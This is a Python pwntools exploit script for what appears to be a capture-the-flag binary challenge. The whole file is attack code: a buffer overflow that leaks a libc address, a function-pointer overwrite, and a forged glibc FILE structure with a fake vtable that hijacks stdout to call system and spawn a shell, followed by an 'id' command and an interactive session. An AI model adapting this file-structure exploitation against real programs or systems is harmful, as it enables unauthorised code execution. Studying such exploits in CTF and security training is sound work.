#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    # log_level='debug',
    binary=ELF('./chall_patched', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata

b *0x4013CA
b *0x40161E
b *0x401480
b *0x401408
b *0x4014ED
b *0x40153E
b *0x401562

c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 9003)
        context.update(terminal = ['tmux', 'splitw', '-h', '-l', '175', '-P', "-d"]) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/home/user3/chall"]))
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

# debug()
sa(b'name: ', b'\0'*248 + b'\x38\x40\x40\x00\x00\x00\x00')
sla(b'type: ', b'1')
sla(b'number: ', b'+')

ru(b'Your data is: ')
libc.address = int(rl()[:-1]) - libc.sym.ssignal
slog('libc base @ %#x', libc.address)

sla(b'type: ', b'2')
sla(b'size: ', b'256')
sa(b'data: ', flat(libc.sym.gets, exe.sym.setup))

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = libc.sym.system
fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
fp._wide_data = libc.sym._IO_2_1_stdout_
fp.vtable = libc.sym._IO_wfile_jumps - 0x20
payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)

sleep(.5)
sl(payload)

sleep(30)
sl(b'id')

interactive()
